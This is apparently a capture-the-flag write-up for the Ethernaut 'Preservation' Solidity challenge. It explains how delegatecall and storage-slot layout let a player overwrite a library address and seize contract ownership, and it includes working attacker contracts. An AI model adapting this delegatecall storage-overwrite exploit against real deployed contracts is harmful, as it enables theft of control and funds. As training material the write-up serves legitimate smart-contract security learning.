# Preservation
###### tags: `writeup`
This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.
The goal of this level is for you to claim ownership of the instance you are given.
Things that might help
* Look into Solidity's documentation on the `delegatecall` low level function, how it works, how it can be used to delegate operations to on-chain. libraries, and what implications it has on execution scope.
* Understanding what it means for `delegatecall` to be context-preserving.
* Understanding how storage variables are stored and accessed.
* Understanding how casting works between different data types.

```javascript
contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```

```javascript
await ethernaut.owner()
"0x1663fcb2f6566723a4c429f8ed34352726680f9a"
```

Both `setFirstTime` and `setSecondTime` use delegatecall to set time for each library.

So, there's simple concept to declare the target contract and rewite the `setTime()` function to change instance owner variable.

Moreover, original `setTime()` in `LibraryContract` doesn't declare variable in right struct, so it will modifie the state at `slot 0`.

First, use `setFirstTime()` to change `timeZone1Library` to become our malicious contract address, then transact to it again to make our payload work.

Our payload might change caller's local variable `owner` to become `tx.origin` which should be our EOA address.

```javascript
pragma solidity ^0.4.23;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);
  }
}

contract PreservationPunisher {
    function Punish(address _target,uint Rewriter) public {
        Preservation target = Preservation(_target);/* Preservation instance address */
        target.setFirstTime(Rewriter);/* Rewrite timeZone1Library to LocalVariableRewritter address */
        target.setFirstTime(0);/* Let LocalVariableRewritte work */
    }
}

contract LocalVariableRewriter {
  address public padding1;
  address public padding2;
  address public owner;

  function setTime(uint playerAddress) public {
    owner = tx.origin;
  }
}
```

Use same attributes and transact twice.

![](https://i.imgur.com/y0rTsrq.png)

![](https://i.imgur.com/lgGvMXm.png)

Well, this method is too rough, you can modify the contract more clean and work in one shot, maybe.